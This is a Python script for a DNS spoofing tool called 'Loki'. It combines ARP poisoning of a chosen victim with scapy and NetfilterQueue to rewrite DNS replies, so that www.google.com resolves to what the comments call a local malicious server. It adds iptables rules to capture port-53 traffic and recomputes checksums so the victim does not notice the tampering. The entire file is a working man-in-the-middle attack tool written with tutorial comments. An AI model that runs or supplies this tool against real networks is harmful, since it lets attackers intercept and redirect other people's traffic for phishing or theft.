from scapy.all import *
from netfilterqueue import NetfilterQueue
import os
import arp_spoofer
import argparse
import threading

# This dictionary redirects requests made to the listed domain names to local malicious servers.
# for example, google.com will be redirected to 192.168.23.128 (could be your machine's IP address).
dns_hosts = {
    b"www.google.com.": "192.168.23.128", # The trailing . is needed, DNS queries are formatted that way.
}

def process_packet(packet):
    """
    Whenever a new packet is redirected to the netfilter queue, this callback is called.
    """
    # convert netfilter queue packet to scapy packet
    scapy_packet = IP(packet.get_payload())
    # print("[Raw]:", scapy_packet.summary())
    if scapy_packet.haslayer(DNSRR): # if the packet is a DNS Resource Record (DNS reply) modify the packet
        print("[Before]:", scapy_packet.summary())
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError: # not UDP packet, this can be IPerror/UDPerror packets
            pass
        print("[After ]:", scapy_packet.summary()) # Convert back to a netfilter queue packet
        packet.set_payload(bytes(scapy_packet)) # Accept the packet
    packet.accept()

def modify_packet(packet):
    """
    Modifies the DNS Resource Record `packet` ( the answer part) to map our globally defined `dns_hosts` dictionary.
    For instance, whenever we see a google.com answer, this function replaces the real IP address (172.217.19.142)
    with fake IP address (192.168.23.128)
    """
    qname = packet[DNSQR].qname # get the DNS question name, the domain name
    if qname not in dns_hosts:
        # if the website isn't in our record we don't wanna modify that
        print("no modification:", qname)
        return packet
    # craft new answer, overriding the original;  setting the rdata for the IP we want to redirect (spoofed)
    # for instance, google.com will be mapped to "192.168.23.128"
    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    packet[DNS].ancount = 1 # Set the answer count to 1
    # delete checksums and length of packet, because we have modified the packet, otherwise the user-agent
    # will be alerted to the tampering. New calculations are required ( scapy will do automatically )
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    return packet

def main():
    parser = argparse.ArgumentParser(description="DNS Spoofer \"Loki\"")
    parser.add_argument("--victim-ip", help="Victim IP Address to ARP poison")
    parser.add_argument("--gateway-ip", help ="Host IP Address, the host you wish to intercept packets for (usually the gateway)")
    args = parser.parse_args()

    QUEUE_NUM = 0
    
    # insert the iptables FORWARD rule
    os.system("iptables -I FORWARD -p udp --dport 53 -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
    os.system("iptables -I INPUT -p udp --dport 53 -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
    os.system("iptables -I FORWARD -p udp --sport 53 -j NFQUEUE --queue-num 0")
    
    arp_thread = threading.Thread(target=arp_spoofer.main, args=(args.victim_ip, args.gateway_ip))
    arp_thread.daemon = True
    arp_thread.start()
    
    queue = NetfilterQueue()
    try:
        queue.bind(QUEUE_NUM, process_packet) # bind the queue number to our callback `process_packet` and start it
        queue.run()
    except KeyboardInterrupt:
        # if want to exit, make sure we remove that rule we just inserted, going back to normal.
        os.system("iptables -D FORWARD -p udp --dport 53 -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
        os.system("iptables -D FORWARD -p udp --sport 53 -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
        os.system("iptables -D INPUT -p udp --dport 53 -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
        # os.system("iptables --flush")

if __name__ == "__main__":
    main()